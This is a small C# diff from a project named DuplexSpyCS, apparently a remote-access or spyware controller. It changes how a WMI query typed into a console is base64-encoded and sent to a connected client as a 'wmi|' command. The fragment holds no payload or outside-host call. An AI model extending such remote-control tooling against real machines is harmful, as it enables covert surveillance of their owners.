@@ -80,7 +80,7 @@ namespace DuplexSpyCS
         {
             int idx_current = richTextBox1.Text.Length;
             string query = richTextBox1.Text[idx_prompt..idx_current];
-            v.encSend(2, 0, "wmi|" + clsCrypto.b64E2Str(query));
+            v.fnSendCommand("wmi|" + clsCrypto.b64E2Str(query));
         }
 
         void setup()
